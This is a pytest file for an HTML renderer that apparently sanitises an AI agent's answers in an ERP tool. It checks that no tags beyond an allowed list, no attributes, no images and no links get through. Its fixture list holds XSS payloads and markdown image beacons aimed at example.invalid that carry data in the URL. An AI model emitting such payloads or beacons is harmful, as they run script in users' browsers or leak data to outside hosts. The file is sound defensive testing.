"""The answer as HTML: only a short list of tags, never an attribute, no images, no clickable links."""

from html.parser import HTMLParser

import pytest

from agent_workcell.render import ALLOWED_TAGS, IMAGE_NOTE, answer_html
from reference_erp.seed import HOSTILE_NOTES


class Tags(HTMLParser):
    def __init__(self, text: str):
        super().__init__(convert_charrefs=True)
        self.tags: list[tuple[str, list]] = []
        self.text = ""
        self.feed(text)
        self.close()

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, attrs))

    def handle_startendtag(self, tag, attrs):
        self.tags.append((tag, attrs))

    def handle_data(self, data):
        self.text += data


def check_safe(html: str) -> Tags:
    parsed = Tags(html)
    for tag, attrs in parsed.tags:
        assert tag in ALLOWED_TAGS, tag
        assert attrs == [], (tag, attrs)
    return parsed


HOSTILE = [
    *HOSTILE_NOTES,
    "<script>alert(1)</script>",
    '<a href="http://example.invalid/x?d=secret">click</a>',
    "<IMG SRC=x onerror=alert(1)>",
    "![chart](http://example.invalid/pixel?d=total-12345)",
    "![](javascript:alert(1))",
    "[Open](javascript:alert(1))",
    "**<b onclick=x>bold</b>**",
    "`<script>`",
    "<svg/onload=alert(1)>",
    '"><iframe src=//example.invalid>',
    "| a | <img src=x> |\n|---|---|\n| [x](http://example.invalid) | ![p](http://example.invalid/p) |",
    "```\n<script>alert(1)</script>\n```",
    "<http://example.invalid/auto>",
    "&lt;img src=x&gt;",
]


@pytest.mark.parametrize("text", HOSTILE)
def test_hostile_text_never_becomes_a_tag_an_attribute_an_image_or_a_link(text):
    html = answer_html(text)
    check_safe(html)  # a parser finds every tag and attribute; text such as "src=" may remain, as plain text
    lowered = html.lower()
    for word in ("<img", "<a ", "<a>", "<script", "<svg", "<iframe"):
        assert word not in lowered, word


def test_the_safety_check_itself_catches_a_tag_or_an_attribute():
    for bad in ('<img src="x">', '<p class="x">text</p>', "<a>x</a>"):
        with pytest.raises(AssertionError):
            check_safe(bad)


def test_an_image_is_removed_and_its_address_is_gone():
    html = answer_html("Total: 12,345 EUR ![x](http://example.invalid/pixel?d=12345)")
    assert IMAGE_NOTE in html and "example.invalid" not in html and "Total: 12,345 EUR" in html


def test_a_link_is_shown_as_plain_text_with_its_address():
    parsed = check_safe(answer_html("See [the order](http://example.invalid/po/1)."))
    assert parsed.text == "See the order (http://example.invalid/po/1)."


def test_raw_html_is_shown_as_text():
    parsed = check_safe(answer_html('<img src="http://example.invalid/pixel">'))
    assert parsed.text == '<img src="http://example.invalid/pixel">'


def test_common_formatting_works():
    html = answer_html("## Open orders\n\nYou have **3** open orders, *all* from `SUP-0001`:\n\n"
                       "- PO-1\n- PO-2\n\n1. first\n2. second\n\n"
                       "| Order | Value |\n|---|---:|\n| PO-1 | 10.00 EUR |\n| PO-2 | 5.00 EUR |\n\n"
                       "```\nSELECT 1\n```")
    check_safe(html)
    assert "<h3>Open orders</h3>" in html
    assert "<strong>3</strong>" in html and "<em>all</em>" in html and "<code>SUP-0001</code>" in html
    assert "<ul><li>PO-1</li><li>PO-2</li></ul>" in html
    assert "<ol><li>first</li><li>second</li></ol>" in html
    assert "<th>Order</th><th>Value</th>" in html and "<td>PO-1</td><td>10.00 EUR</td>" in html
    assert "<pre><code>SELECT 1</code></pre>" in html


def test_formatting_inside_code_is_left_alone():
    assert answer_html("`**not bold** [x](y)`") == "<p><code>**not bold** [x](y)</code></p>"


def test_an_empty_answer_gives_empty_html():
    assert answer_html("") == ""
